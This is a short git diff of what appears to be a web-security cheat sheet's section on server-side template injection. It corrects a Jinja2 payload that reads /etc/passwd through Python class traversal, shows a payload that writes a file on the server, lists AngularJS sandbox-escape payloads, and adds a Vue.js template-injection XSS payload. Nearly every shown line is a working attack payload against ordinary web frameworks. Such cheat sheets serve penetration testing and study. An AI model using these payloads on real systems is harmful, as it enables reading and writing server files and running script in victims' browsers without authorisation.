@@ -1472,7 +1472,7 @@ Server-Side Template Injection
     - `{{ ''.__class__.__mro__[2].__subclasses__() }}
 `
 - Read File
-    - `{{}}''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}`
+    - `{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}`
 - Write File
     - `{{''.__class__.__mro__[2].__subclasses__()[40]('/var/www/app/a.txt', 'w').write('Kaibro Yo!')}}`
 - RCE
@@ -1498,7 +1498,9 @@ Server-Side Template Injection
     - `{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}` v1.5.0-v1.5.8
     - `{{ [].pop.constructor('alert(1)')() }}` 2.8 v1.6.0-1.6.6
 
-    
+## vue.js
+- `{{constructor.constructor('alert(1)')()}}`
+- https://github.com/dotboris/vuejs-serverside-template-xss
 
 ## Python
 - `%`
